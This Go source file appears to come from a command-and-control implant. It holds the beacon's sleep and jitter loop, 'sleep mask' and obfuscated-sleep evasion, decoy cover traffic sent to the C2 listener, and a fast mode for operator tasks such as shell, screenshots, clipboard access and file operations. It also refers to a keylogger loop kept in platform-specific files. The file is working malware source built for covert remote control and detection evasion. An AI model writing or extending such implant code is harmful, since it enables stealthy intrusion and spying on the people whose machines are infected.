package main

import (
	mathRand "math/rand"
	"runtime"
	"time"
)

func sleepWithJitter() {
	// Use sleep variator for non-default modes
	mode := getSleepMode()
	if mode != SleepModeDefault && mode != SleepModeInteractive {
		duration := computeSleepDuration()
		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Use JIT scheduler on Windows if available
	if runtime.GOOS == "windows" && beaconSched != nil {
		if beaconSched.ShouldBeaconNow() {
			return
		}
		duration := beaconSched.ComputeNext()

		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		time.Sleep(duration)
		return
	}

	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
	if Interval <= 0 {
		d := 200 * time.Millisecond
		if inFastMode.Load() {
			d = 50 * time.Millisecond
		}
		waitForBeaconWake(d)
		return
	}
	baseInterval := Interval
	if inFastMode.Load() {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))

	// If Sleep Mask is initialized, use encrypted sleep
	if sleepMaskActive {
		sleepWithMask(base + variation)
		return
	}
	if evasionEnabled {
		sleepObfuscated(base + variation)
		return
	}
	waitForBeaconWake(base + variation)
}

func waitForBeaconWake(duration time.Duration) {
	// Guard against non-positive durations (e.g. extreme negative jitter) which
	// would panic time.NewTimer or busy-loop. Interactive fast mode legitimately
	// passes sub-second values, so only floor at zero here.
	if duration < 0 {
		duration = 0
	}
	// Cover traffic: sprinkle decoy requests to the C2 listener at a random
	// point inside the sleep window so the beacon cadence is less regular.
	// getActiveCoverTraffic() returns false unless an operator opted in.
	if duration > 0 {
		if enabled, _ := getActiveCoverTraffic(); enabled {
			go func() {
				d := time.Duration(mathRand.Int63n(int64(duration)))
				time.Sleep(d)
				sendCoverTrafficBurst()
			}()
		}
	}
	timer := time.NewTimer(duration)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-beaconWake:
	}
}

func checkFastMode(tasks []Task) {
	inFastMode.Store(false)
	fastTypes := map[string]bool{
		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
		"services": true, "beacon_now": true, "ls": true, "read": true,
		"mkdir": true, "rename": true, "chmod": true,
	}
	for _, task := range tasks {
		if fastTypes[task.Type] {
			inFastMode.Store(true)
			return
		}
	}
}

// beaconBackoffSec returns the base backoff (seconds) for a given number of
// consecutive beacon failures. The exponent is clamped so the left shift can
// never overflow int64 (1<<63 at 64 failures) and the result stays positive
// and bounded by the 300s ceiling.
func beaconBackoffSec(failures int) int {
	if failures <= 0 {
		return 0
	}
	exp := failures - 1
	if exp > 9 {
		exp = 9
	}
	backoff := 1 << uint(exp)
	if backoff > 300 {
		backoff = 300
	}
	return backoff
}

// setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
// platform-specific files (agent_windows.go / agent_linux.go) via build tags.
